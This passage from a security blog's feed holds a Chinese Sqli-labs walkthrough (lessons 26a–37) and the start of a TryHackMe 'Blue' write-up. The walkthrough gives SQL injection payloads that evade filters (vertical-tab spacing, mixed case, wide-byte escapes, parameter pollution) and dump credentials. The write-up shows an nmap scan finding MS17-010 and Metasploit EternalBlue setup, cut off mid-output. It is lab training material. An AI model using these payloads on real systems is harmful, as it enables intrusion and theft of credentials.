class="line"></span><br><span class="line">// where 1=1 为无约束查询</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117230259432.png" class><h2 id="0x08-Less-26a-GET-基于bool-过滤-单引号加括号"><a href="#0x08-Less-26a-GET-基于bool-过滤-单引号加括号" class="headerlink" title="0x08.Less-26a GET 基于bool 过滤 单引号加括号"></a>0x08.Less-26a GET 基于bool 过滤 单引号加括号</h2><p><code>同Less-26相同，需要在单引号后加一个括号</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27)%0bunion%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%0bfrom%0busers%0bwhere(%271=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117230816390.png" class><h2 id="0x09-Less-27-GET-基于报错-过滤空格与字符-单引号"><a href="#0x09-Less-27-GET-基于报错-过滤空格与字符-单引号" class="headerlink" title="0x09.Less-27 GET 基于报错 过滤空格与字符 单引号"></a>0x09.Less-27 GET 基于报错 过滤空格与字符 单引号</h2><p><code>查看源码发现又过滤union、select</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>这里可以使用大小写进行绕过，如uNion、sElect，方法同上</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere%271=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118180520892.png" class><h2 id="0x10-Less-27a-GET-基于bool-过滤-双引号"><a href="#0x10-Less-27a-GET-基于bool-过滤-双引号" class="headerlink" title="0x10.Less-27a GET 基于bool 过滤 双引号"></a>0x10.Less-27a GET 基于bool 过滤 双引号</h2><p><code>同上需将单引号换为双引号</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;%0band%0b&quot;1&quot;=&quot;1</span><br><span class="line">?id=1&quot;%0band%0b&quot;1&quot;=&quot;2</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182211616.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182234928.png" class><p><code>测试字段数</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;%0buNion%0bsElect%0b1,2,3%0band%0b&quot;1&quot;=&quot;1</span><br><span class="line">?id=1&quot;%0buNion%0bsElect%0b1,2,3,4%0band%0b&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182105167.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182130359.png" class><p><code>放法同上一题不在赘述</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182421291.png" class><h2 id="0x11-Less-28-GET-基于报错-过滤-单引号加括号"><a href="#0x11-Less-28-GET-基于报错-过滤-单引号加括号" class="headerlink" title="0x11.Less-28 GET 基于报错 过滤 单引号加括号"></a>0x11.Less-28 GET 基于报错 过滤 单引号加括号</h2><p><code>闭合字符为&#39;)其他过程同上</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;)%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere(&#x27;1=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118191510874.png" class><h2 id="0x12-Less-28a-GET-基于bool-过滤-双引号"><a href="#0x12-Less-28a-GET-基于bool-过滤-双引号" class="headerlink" title="0x12.Less-28a GET 基于bool 过滤 双引号"></a>0x12.Less-28a GET 基于bool 过滤 双引号</h2><p><code>闭合字符为&quot;其他过程同上</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere&quot;1=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118192025320.png" class><h2 id="0x13-Less-29-GET-基于报错-绕过WAF"><a href="#0x13-Less-29-GET-基于报错-绕过WAF" class="headerlink" title="0x13.Less-29 GET 基于报错 绕过WAF"></a>0x13.Less-29 GET 基于报错 绕过WAF</h2><p><code>说是存在waf但是常规注入就可以？一脸懵逼。。。</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,group_concat(username,0x7e,password),3 from users where &#x27;1=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118200656209.png" class><h2 id="0x14-Less-30-GET-基于bool-绕过WAF"><a href="#0x14-Less-30-GET-基于bool-绕过WAF" class="headerlink" title="0x14.Less-30 GET 基于bool 绕过WAF"></a>0x14.Less-30 GET 基于bool 绕过WAF</h2><p><code>跟上题一样</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot; union select 1,group_concat(username,0x7e,password),3 from users where&quot;1=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118201045806.png" class><h2 id="0x15-Less-31-GET-基于bool-绕过WAF"><a href="#0x15-Less-31-GET-基于bool-绕过WAF" class="headerlink" title="0x15.Less-31 GET 基于bool 绕过WAF"></a>0x15.Less-31 GET 基于bool 绕过WAF</h2><p><code>跟上题一样</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;) union select 1,group_concat(username,0x7e,password),3 from users where(&quot;1=1</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118201428847.png" class><blockquote><p>这三道题很奇怪，说是有waf但是啥也没有。绕过waf参考以下文章</p></blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L256amRzZHMvYXJ0aWNsZS9kZXRhaWxzLzc3NzU4ODI0">参考<i class="fa fa-external-link-alt"></i></span></p><p><code>第一个id参数用于欺骗waf，第二个为真实查询</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0&quot;) -- -</span><br><span class="line">?id=1&amp;id=1&quot;) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118202113371.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118202142173.png" class><h2 id="0x16-Less-32-GET-绕过转义字符"><a href="#0x16-Less-32-GET-绕过转义字符" class="headerlink" title="0x16.Less-32 GET 绕过转义字符\"></a>0x16.Less-32 GET 绕过转义字符\</h2><p><code>这里写引号会被加上\进行转义</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118212716561.png" class><p><code>可以使用宽字节进行绕过，汉字你的url编码为%e4%bd%a0，这里提取%e4与\进行拼接，但是他并不是一个汉字，就可以绕过\</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118215012643.png" class><p><code>老方法，直接查询</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118220631992.png" class><p><code>爆字段</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=users -- -</span><br></pre></td></tr></table></figure><p><code>但是这里出现了个问题，说是没有users见了鬼了，上面明明查出来了呀</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118220853724.png" class><p><code>这里发现users被加上了单引号，如何逃脱这种束缚呢，将users转为16进制编码即可</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118221744344.png" class><p><code>爆数据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118222615247.png" class><h2 id="0x17-Less-33-GET-绕过转义字符"><a href="#0x17-Less-33-GET-绕过转义字符" class="headerlink" title="0x17.Less-33 GET 绕过转义字符\"></a>0x17.Less-33 GET 绕过转义字符\</h2><p><code>跟上一道题一毛一样，怪事</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118222957733.png" class><h2 id="0x18-Less-34-POST-绕过转义字符"><a href="#0x18-Less-34-POST-绕过转义字符" class="headerlink" title="0x18.Less-34 POST 绕过转义字符\"></a>0x18.Less-34 POST 绕过转义字符\</h2><p><code>同上一题，只是字段有2两个</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1%e4&#x27; order by 3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119101637618.png" class><p><code>其他过程同上</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=0%e4&#x27; union select 1,group_concat(username,0x7e,password) from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119101747730.png" class><h2 id="0x19-Less-35-GET-绕过-（不需要）"><a href="#0x19-Less-35-GET-绕过-（不需要）" class="headerlink" title="0x19.Less-35 GET 绕过\（不需要）"></a>0x19.Less-35 GET 绕过\（不需要）</h2><p><code>这题醉了，说是绕过\，但是没有闭合字符，😂</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0 union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119103112599.png" class><h2 id="0x20-Less-36-GET-绕过Mysql-real-escape-string"><a href="#0x20-Less-36-GET-绕过Mysql-real-escape-string" class="headerlink" title="0x20.Less-36 GET 绕过Mysql_real_escape_string"></a>0x20.Less-36 GET 绕过Mysql_real_escape_string</h2><blockquote><p> 查看源码发现，参数会被mysql_real_escape_string转义</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= mysql_real_escape_string($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>定义和用法</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line"></span><br><span class="line">下列字符受影响：</span><br><span class="line"></span><br><span class="line"> \x00</span><br><span class="line"> \n</span><br><span class="line"> \r</span><br><span class="line"> \</span><br><span class="line"> &#x27;</span><br><span class="line"> &quot;</span><br><span class="line"> \x1a</span><br><span class="line"></span><br><span class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 语法</span></span><br><span class="line"></span><br><span class="line">mysql_real_escape_string(string,connection)</span><br><span class="line"></span><br><span class="line">| 参数       | 描述                                                  |</span><br><span class="line">| :--------- | :---------------------------------------------------- |</span><br><span class="line">| string     | 必需。规定要转义的字符串。                            |</span><br><span class="line">| connection | 可选。规定 MySQL 连接。如果未规定，则使用上一个连接。 |</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 说明</span></span><br></pre></td></tr></table></figure><p>本函数将 <em>string</em> 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于 <span class="exturl" data-url="aHR0cHM6Ly93d3cudzNzY2hvb2wuY29tLmNuL3BocC9mdW5jX215c3FsX3F1ZXJ5LmFzcA==">mysql_query()<i class="fa fa-external-link-alt"></i></span>。</p><p><code>测试闭合字符，结果为单引号</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1%e4&#x27; and 1=1 -- -</span><br><span class="line">?id=1%e4&#x27; and 1=2 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119103932605.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119104044212.png" class><p><code>其他过程同上</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119103818736.png" class><h2 id="0x21-Less-37-POST-绕过Mysql-real-escape-string"><a href="#0x21-Less-37-POST-绕过Mysql-real-escape-string" class="headerlink" title="0x21.Less-37 POST 绕过Mysql_real_escape_string"></a>0x21.Less-37 POST 绕过Mysql_real_escape_string</h2><p><code>与上一题一样</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = mysql_real_escape_string($uname1);</span><br><span class="line">$passwd= mysql_real_escape_string($passwd1);</span><br></pre></td></tr></table></figure><p><code>按照上一题的方法，但是结果并不是我想象的那样，闭合字符怎么也找不到，于是抓包发现%会被编码为%25</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119111554948.png" class><p><code>所以可以将%25换为%</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119111930781.png" class><p><code>其他过程同上</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%e4%27 union select 1,group_concat(username,0x7e,password) from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119112040350.png" class>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;Sqli_labs_Page2(advance)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;strong&gt;skip:基础篇环境为windows，但在提高篇有些关卡会出现解析错误，本篇使用docker搭建的Linux环境&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/categories/Sqli-labs/"/>
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/tags/Sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>tryhackme-[blue]</title>
    <link href="https://lunamoore.github.io/2021/01/15/tryhackme-blue/"/>
    <id>https://lunamoore.github.io/2021/01/15/tryhackme-blue/</id>
    <published>2021-01-15T11:53:54.000Z</published>
    <updated>2021-01-15T11:56:55.030Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Demo"><a href="#0x01-Demo" class="headerlink" title="0x01.Demo"></a>0x01.Demo</h2><img src="/2021/01/15/tryhackme-blue/image-20210115194912000.png" class><a id="more"></a><h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02.信息收集"></a>0x02.信息收集</h2><p><code>看到了ms17-010(永恒之蓝)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/blue# nmap -sC -vv --script=vuln 10.10.246.255 -oN nmap.demo</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-15 05:38 EST</span><br><span class="line">NSE: Loaded 105 scripts for scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:38</span><br><span class="line">Completed NSE at 05:38, 10.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:38</span><br><span class="line">Completed NSE at 05:38, 0.00s elapsed</span><br><span class="line">Initiating Ping Scan at 05:38</span><br><span class="line">Scanning 10.10.246.255 [4 ports]</span><br><span class="line">Completed Ping Scan at 05:38, 0.30s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 05:38</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 05:38, 0.02s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 05:38</span><br><span class="line">Scanning 10.10.246.255 [1000 ports]</span><br><span class="line">Discovered open port 445/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 3389/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 139/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 135/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49154/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49159/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49153/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49158/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49152/tcp on 10.10.246.255</span><br><span class="line">Completed SYN Stealth Scan at 05:39, 46.22s elapsed (1000 total ports)</span><br><span class="line">NSE: Script scanning 10.10.246.255.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:39</span><br><span class="line">NSE: [ssl-ccs-injection 10.10.246.255:3389] No response from server: ERROR</span><br><span class="line">NSE Timing: About 88.47% done; ETC: 05:39 (0:00:04 remaining)</span><br><span class="line">NSE Timing: About 89.08% done; ETC: 05:40 (0:00:07 remaining)</span><br><span class="line">Completed NSE at 05:40, 90.23s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:40</span><br><span class="line">Completed NSE at 05:40, 0.00s elapsed</span><br><span class="line">Nmap scan report for 10.10.246.255</span><br><span class="line">Host is up, received echo-reply ttl 127 (0.25s latency).</span><br><span class="line">Scanned at 2021-01-15 05:38:32 EST for 136s</span><br><span class="line">Not shown: 991 closed ports</span><br><span class="line">Reason: 991 resets</span><br><span class="line">PORT      STATE SERVICE       REASON</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127</span><br><span class="line">445/tcp   open  microsoft-ds  syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127</span><br><span class="line">|_ssl-ccs-injection: No reply from server (TIMEOUT)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">49152/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49153/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49154/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49158/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49159/tcp open  unknown       syn-ack ttl 127</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line">|_smb-vuln-ms10-054: false</span><br><span class="line">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk factor: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:40</span><br><span class="line">Completed NSE at 05:40, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:40</span><br><span class="line">Completed NSE at 05:40, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 147.23 seconds</span><br><span class="line">           Raw packets sent: 1189 (52.292KB) | Rcvd: 1066 (42.672KB)</span><br><span class="line">root@JIYE:~/tryhackme/blue#</span><br></pre></td></tr></table></figure><h2 id="0x03-MSF直接利用"><a href="#0x03-MSF直接利用" class="headerlink" title="0x03.MSF直接利用"></a>0x03.MSF直接利用</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.10.246.255</span><br><span class="line">rhosts =&gt; 10.10.246.255</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 10.9.248.83</span><br><span class="line">lhost =&gt; 10.9.248.83</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS         10.10.246.255    yes       The target host(s), range CIDR identifier, 